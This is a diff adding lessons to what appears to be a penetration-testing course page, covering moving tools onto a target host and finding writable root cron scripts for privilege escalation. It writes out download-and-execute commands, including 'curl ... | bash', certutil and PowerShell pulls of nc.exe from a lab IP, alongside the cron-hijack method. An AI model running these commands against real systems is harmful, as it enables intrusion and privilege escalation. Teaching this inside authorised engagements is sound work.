@@ -80,6 +80,57 @@ cmd 2>&1               # merge stderr into stdout
 cmd1 | cmd2            # pipe stdout of cmd1 into stdin of cmd2
 nmap -oN scan.txt 10.10.10.5    # nmap's own flag for saving normal-format output`}</CodeBlock>
 
+      <h2>Getting tools and data across the wire</h2>
+      <p>
+        A foothold is rarely useful until you can move something across it — a privilege-escalation script
+        onto the target, or loot back off it. The tool that's actually available differs box to box, so
+        knowing several equivalent methods matters more than memorizing one.
+      </p>
+      <CodeBlock label="serving files from your attack box">{`python3 -m http.server 8000          # instantly serves the current directory over HTTP
+python -m SimpleHTTPServer 8000       # the same, on a target's ancient Python 2`}</CodeBlock>
+      <CodeBlock label="pulling files onto a Linux target">{`wget http://10.10.10.5:8000/linpeas.sh -O /tmp/linpeas.sh
+curl http://10.10.10.5:8000/linpeas.sh -o /tmp/linpeas.sh
+curl http://10.10.10.5:8000/linpeas.sh | bash          # fetch and execute in one step`}</CodeBlock>
+      <CodeBlock label="the Windows equivalents you'll meet on mixed-OS engagements">{`certutil.exe -urlcache -f http://10.10.10.5:8000/nc.exe nc.exe   # a genuine LOLBin —
+                                                                    # a signed Windows binary abused for
+                                                                    # an unintended purpose (fetching files)
+powershell -c "IWR http://10.10.10.5:8000/nc.exe -OutFile nc.exe"`}</CodeBlock>
+      <p>
+        When no file-transfer tool at all is available — a heavily restricted shell, for instance — text can
+        still cross the wire by encoding binary data as printable characters and pasting it through the
+        terminal itself.
+      </p>
+      <CodeBlock label="base64 as a last-resort transfer channel">{`base64 -w0 payload.bin > payload.b64      # encode on the source, then paste the output
+base64 -d payload.b64 > payload.bin         # ...and decode it back on the destination`}</CodeBlock>
+      <Callout variant="tip">
+        <p>
+          <code>certutil</code> is a real, well-documented LOLBin (Living-Off-the-Land Binary) — a legitimate,
+          digitally-signed OS binary repurposed for something its authors never intended. It's worth
+          recognizing by name: defenders specifically watch for <code>certutil -urlcache</code> in process logs
+          precisely because it's such a common, signature-evading way to pull a second-stage payload onto a
+          Windows host without ever touching a browser.
+        </p>
+      </Callout>
+
+      <h2>Inspecting scheduled tasks: cron</h2>
+      <p>
+        The Callout above mentioned cron jobs as a classic privilege-escalation vector — here's how to actually
+        look for them. A cron job that runs as root but executes a script writable by your current user is one
+        of the most common real privesc paths on a Linux box: edit the script, wait for the next scheduled
+        run, and it executes as root.
+      </p>
+      <CodeBlock label="finding what's actually scheduled">{`crontab -l                 # the CURRENT user's own scheduled jobs
+sudo crontab -l -u root      # root's crontab, if you already have sudo rights to check
+cat /etc/crontab               # system-wide jobs, alongside the user each one runs as
+ls -la /etc/cron.d/              # additional system-wide job definitions, one file per package/service
+ls -la /etc/cron.hourly /etc/cron.daily   # scripts run automatically on these intervals`}</CodeBlock>
+      <p>
+        The privesc check that matters most: for every cron entry that runs as root, is the script it calls
+        writable by anyone else? <code>ls -la</code> on that script's path answers it directly — a
+        world-writable or group-writable script invoked by root's crontab is a scheduled privilege escalation
+        waiting to be used.
+      </p>
+
       <Callout variant="warn">
         <p>
           Every one of these commands is completely legitimate system administration. What makes it
@@ -89,6 +140,12 @@ nmap -oN scan.txt 10.10.10.5    # nmap's own flag for saving normal-format outpu
           scope of engagement.
         </p>
       </Callout>
+
+      <p>
+        With process management, networking, and file transfer covered, the next lesson turns from single
+        commands to full scripts — chaining exactly these tools together with Bash's control flow so an
+        entire recon or enumeration routine runs unattended instead of one manual command at a time.
+      </p>
     </div>
   );
 }
